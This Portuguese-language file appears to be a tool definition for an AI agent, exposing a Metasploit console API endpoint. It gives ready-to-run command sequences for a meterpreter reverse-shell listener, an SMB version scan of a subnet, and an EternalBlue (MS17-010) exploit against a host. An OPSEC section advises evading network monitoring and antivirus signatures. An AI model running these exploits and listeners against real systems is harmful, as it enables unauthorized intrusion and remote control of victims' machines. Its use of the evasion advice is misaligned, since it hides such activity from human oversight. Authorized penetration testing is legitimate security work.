---
name: msfconsole
description: Console de automação do Metasploit Framework. Permite execução de exploits, scanners auxiliares, criação de listeners (handlers) e pós-exploração via API.
---

# msfconsole

## Objetivo
- Automação de tarefas do Metasploit Framework
- Execução de módulos de exploração (exploits)
- Varreduras de vulnerabilidade e reconhecimento (auxiliary)
- Configuração de listeners para receber conexões reversas (multi/handler)
- Pós-exploração e coleta de dados em sessões ativas

## Endpoint
- `/api/exploit/msfconsole`

## Requer target
- não (o target é definido dentro dos comandos)

## Parâmetros
| Parâmetro | Tipo   | Obrigatório | Descrição                                             |
|-----------|--------|-------------|-------------------------------------------------------|
| commands  | array  | sim         | Lista sequencial de comandos do console MSF a executar |

## Comandos Importantes
| Comando                       | Função                                                   |
|-------------------------------|----------------------------------------------------------|
| `use <modulo>`                | Seleciona um módulo (exploit, auxiliary, post, etc)      |
| `set <opcao> <valor>`         | Configura uma opção do módulo (RHOSTS, LHOST, LPORT)     |
| `setg <opcao> <valor>`        | Configura uma opção globalmente                          |
| `run` ou `exploit`            | Executa o módulo selecionado                             |
| `show options`                | Lista opções disponíveis (útil para debug)               |
| `exit`                        | Encerra a sessão do console                              |

## Exemplos

### Caso 1: Listener para Reverse Shell (Multi Handler)
Configura um listener para receber uma conexão reversa de um payload Windows.

```json
{
  "commands": [
    "use exploit/multi/handler",
    "set payload windows/x64/meterpreter/reverse_tcp",
    "set LHOST 192.168.1.100",
    "set LPORT 4444",
    "set ExitOnSession false",
    "run -j"
  ]
}
```

### Caso 2: Scanner de Versão SMB (Auxiliary)
Identifica a versão do Windows via protocolo SMB.

```json
{
  "commands": [
    "use auxiliary/scanner/smb/smb_version",
    "set RHOSTS 192.168.1.0/24",
    "set THREADS 10",
    "run"
  ]
}
```

### Caso 3: Exploração MS17-010 (EternalBlue)
Exemplo de configuração para exploração de vulnerabilidade crítica.

```json
{
  "commands": [
    "use exploit/windows/smb/ms17_010_eternalblue",
    "set RHOSTS 192.168.1.50",
    "set LHOST 192.168.1.100",
    "set LPORT 4444",
    "exploit"
  ]
}
```

## OPSEC
- Evite scans agressivos (`db_nmap`) em redes monitoradas; prefira módulos auxiliares específicos.
- Use `setg` com cuidado para não contaminar configurações de módulos subsequentes na mesma sessão.
- Payloads `meterpreter` geram tráfego de rede significativo e podem ser assinados por AVs; considere `shell/reverse_tcp` para menor pegada.
- Sempre verifique `LHOST` e `LPORT` para garantir conectividade reversa correta.

## Saída
- `success`: indica se a sequência de comandos foi submetida com sucesso.
- `stdout`: captura da saída do console do Metasploit.
- `report`: análise estruturada dos resultados (sessões abertas, vulnerabilidades encontradas).
